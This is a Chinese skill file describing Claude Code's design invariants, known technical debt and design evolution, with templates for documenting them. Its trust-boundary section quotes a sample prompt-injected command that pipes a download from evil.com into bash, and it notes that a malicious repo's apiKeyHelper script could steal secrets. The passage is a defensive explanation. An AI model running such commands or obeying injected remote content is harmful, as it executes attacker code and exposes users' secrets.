---
name: architecture-invariants
description: "CC 的系统级设计不变式和进化轨迹：6 条不变式 + 已知技术债 + 被否决的方案 + 安全审查驱动进化"
user-invocable: true
argument-hint: "<目标项目路径或模块名>"
---

# 架构不变式与进化轨迹 (Architecture Invariants & Evolution)

> 从 Claude Code 源码注释、DEPRECATED 标记、HACK/WORKAROUND 标记、HackerOne 报告引用中提取的系统级设计约束和进化证据

## 核心思想

**知道"做了什么"不够——还要知道"不做什么"和"为什么不那样做"。** 这个 skill 记录 CC 的隐式架构约束（不变式）、已知技术债（知道但还没修的）、以及设计是怎么在事故/安全报告中进化的。

---

## 一、6 条系统级不变式

这些约束贯穿整个代码库，不是某个模块的局部决策：

### 不变式 1：浅合并，不深合并

```
CC 的设置系统、工具覆盖、Agent 上下文覆盖全部用浅合并（后者整体替换前者的同名字段）。

为什么不用深合并：
  深合并在嵌套对象中产生不可预测的行为。
  例：userSettings.hooks.PreToolUse = [A]
      projectSettings.hooks.PreToolUse = [B]
  
  深合并 → hooks.PreToolUse = [A, B]（累加了）
  浅合并 → hooks.PreToolUse = [B]（project 完整覆盖 user）
  
  累加在权限规则中是对的（deny + allow 规则确实要合并），
  但在 hooks 中是错的（project 的 hook 不应该和 user 的混在一起）。
  
  CC 选择：对大部分字段浅合并，只在权限规则这个特例中用累加。
```

### 不变式 2：不信任运行时动态值做 cache key

```
参与 prompt cache key 的参数在会话开始时锁定，整个会话不变。

为什么不用实时值：
  实时值 → mid-session 变化 → cache key 变 → ~20K token 重新付费
  session latch → 整个会话一致 → cache hit 率最高
  
  代价：会话中途切换了 overage 状态，TTL 不会立即生效。
  CC 接受这个代价（sub-optimal TTL < cache miss cost）。
```

### 不变式 3：子 Agent 不能污染主线程状态

```
子 Agent 的状态修改是单向隔离的：

  主线程 → 子 Agent：继承（systemPrompt, tools, context）
  子 Agent → 主线程：只通过消息（task-notification, tool_result）
  子 Agent ✗ 主线程：不能写 CacheSafeParams snapshot
  子 Agent ✗ 主线程：不能修改 post-compact 模块级状态
  子 Agent ✗ 主线程：不能修改 denialTracking 计数器
  
为什么：
  多个子 Agent 并发修改主线程状态 → 竞争条件 → 不可重现的 bug。
  单向隔离 = 子 Agent 是纯函数（输入 → 输出），不是 side-effect 源。
```

### 不变式 4：不用数据库

```
所有持久化都用文件系统：
  会话 → JSONL（append-only）
  配置 → JSON（project.json, settings.json）
  记忆 → Markdown（MEMORY.md + 主题文件）
  文件备份 → 原始字节（hash@version）
  
为什么不用 SQLite/LevelDB：
  1. JSONL 是 append-only → 崩溃最多丢最后一行
  2. 文件系统可 git 跟踪（settings.json 在仓库里）
  3. 不需要额外依赖（零安装成本）
  4. 人类可直接 cat/grep 调试
  
代价：
  查询效率低（列出会话要读目录 + 解析文件头尾）
  CC 用 head/tail 快速读取 JSONL 头尾来提取元数据，而不是全量解析。
```

### 不变式 5：远程来源不能执行本地代码

```
信任边界清晰：
  本地 Skill（.claude/skills/）→ 可以执行 !`shell command`
  MCP Skill（远程服务器）→ 禁止执行 shell 命令
  本地 Agent（agents/ 目录）→ 完整工具集
  远程 Agent（CCR）→ 隔离环境
  
为什么：
  远程内容可能被 prompt injection 控制。
  如果 MCP 服务器返回 "!`curl evil.com | bash`"，
  不做信任边界检查 → 本地执行恶意代码。
  
扩展到 apiKeyHelper：
  来自 projectSettings 的 apiKeyHelper 脚本也需要信任对话框确认。
  恶意仓库可以在 .claude/settings.json 里写一个窃取 secrets 的脚本。
```

### 不变式 6：fail-closed 默认值，opt-in 危险行为

```
所有安全相关的默认值选"最保守的那个"：
  isConcurrencySafe → false（假设不安全 → 串行执行）
  isReadOnly → false（假设有写入 → 需要权限）
  isDestructive → false（但仍然默认 ask 而不是 allow）
  checkPermissions → passthrough（交给规则层决定）
  
新工具忘了声明特性 → 系统按最保守方式运行。
不会出现"忘了标记危险 → 自动放行"的事故。
```

---

## 二、已知技术债（WORKAROUND / TODO / HACK）

从源码注释中提取的已知但还没修的问题：

### 技术债 1：GrowthBook SDK 不用预评估值

```typescript
// src/services/analytics/growthbook.ts:378-385
// WORKAROUND: Cache the evaluated values directly from remote eval response.
// The SDK's evalFeature() tries to re-evaluate rules locally, ignoring the
// pre-evaluated 'value' from remoteEval.
```

**问题**：SDK 不信任服务端预评估结果，本地重新评估 → 结果可能不一致。
**临时方案**：直接缓存服务端值，绕过 SDK 评估。
**清理时机**：等 SDK 修复。

### 技术债 2：MCP OAuth 缺跨进程锁

```typescript
// src/services/mcp/auth.ts:1743
// _refreshInProgress flag does not survive across processes
// TODO: add cross-process lockfile before GA
```

**问题**：MCP OAuth token 刷新的去重只在进程内有效。
**风险**：多进程同时刷新同一个 MCP 服务器的 token。
**清理时机**：GA 前。

### 技术债 3：bashCommandIsSafe_DEPRECATED 仍在使用

```
6 个文件仍引用 bashCommandIsSafe_DEPRECATED()
Tree-sitter 路径是正确实现，regex 路径是旧实现
但旧实现作为 fallback 仍然需要
```

**策略**：渐进迁移，不一刀切删除。带 `_DEPRECATED` 后缀让开发者知道这是遗留代码。

---

## 三、设计进化证据 — "从方案 A 换到方案 B"

### 进化 1：Agent 列表从工具描述移到附件消息

```
Before: Agent 列表嵌入 AgentTool.description 
  → MCP 连接/断开时 description 变化
  → tool schema cache bust
  → 浪费 10.2% fleet cache_creation token

After: Agent 列表作为 attachment message 发送
  → description 恒定
  → cache 不再因 Agent 列表变化而失效
  → 节省 10.2% cache_creation token
```

**驱动力**：成本数据（10.2% 的 fleet cache_creation）。

### 进化 2：安全检查从 regex 到 Tree-sitter

```
Before: bashCommandIsSafe_DEPRECATED() — 全靠 regex
  → 无法区分 find -exec \; 和 cat safe.txt \;
  → 误报率高

After: Tree-sitter AST 解析 + regex fallback
  → 精确识别运算符节点
  → find -exec \; 允许，cat safe.txt \; 拒绝
  → 误报率降低
```

**驱动力**：用户体验（误报 → 用户反复确认 → 烦）+ 安全（HackerOne 报告发现 regex 漏洞）。

### 进化 3：RSS 内存回归驱动的内容策略变更

```typescript
// src/components/Markdown.tsx:21
// "retaining full content strings (turn50→turn99 RSS regression, #24180)"
```

**Before**：保留完整内容字符串用于渲染。
**After**：不再保留（释放内存）。
**驱动力**：第 50-99 轮时 RSS 内存暴涨（PR #24180）。

### 进化 4：安全审查轮次驱动的渐进加固

```typescript
// src/tools/BashTool/pathValidation.ts:1160-1171
// Hit 3× in PR #21075, twice more in PR #21503
// PR #21503 had at least 3 rounds of security review

// Round 1: basic path checks
// Round 2: handle unrecognized durations
// Round 3: wider stdbuf checks, bare operators
```

**模式**：每轮 review 发现新边界 → 加固 → 再 review → 再加固。不是一次写对。

---

## 四、实施指南

### 建立你的不变式清单

```markdown
# 项目不变式

## INV-1: [名称]
- 规则：[做什么/不做什么]
- 为什么：[违反会出什么事]
- 代价：[遵守的代价是什么]
- 验证：[怎么检查没被违反]

## INV-2: ...
```

### 记录技术债

```markdown
# 已知技术债

## DEBT-1: [描述]
- 位置：[文件:行号]
- 风险：[不修会怎样]
- 清理时机：[什么条件下修]
- WORKAROUND：[目前怎么绕过的]
```

### 记录进化轨迹

```markdown
# 设计进化记录

## 2026-03: Agent 列表从工具描述移到附件
- Before: 嵌入 AgentTool.description
- After: 独立 attachment message
- 驱动力: 10.2% cache_creation 浪费（成本数据）
- PR: #xxxxx
```

---

## 五、实施步骤

请分析用户的 $ARGUMENTS 中指定的项目，然后：

1. **识别隐式不变式**：找到代码中反复出现的约束模式（总是浅合并、总是锁定、总是隔离）
2. **显式记录**：写成 INV-N 清单，附上"违反会怎样"
3. **标记技术债**：WORKAROUND/TODO/HACK 不是耻辱——不标记才是
4. **记录进化**：每次"从方案 A 换到方案 B"时写 Before/After/驱动力
5. **安全审查驱动**：把安全报告的发现作为设计进化的输入

**反模式警告**：
- 不要只记录"做了什么" — 同时记录"不做什么"（不变式）
- 不要假装没有技术债 — _DEPRECATED 后缀比静默遗留好
- 不要一次写对 — 安全是多轮 review 渐进加固的
- 不要把不变式放在文档里 — 放在代码注释里（紧挨被约束的代码）
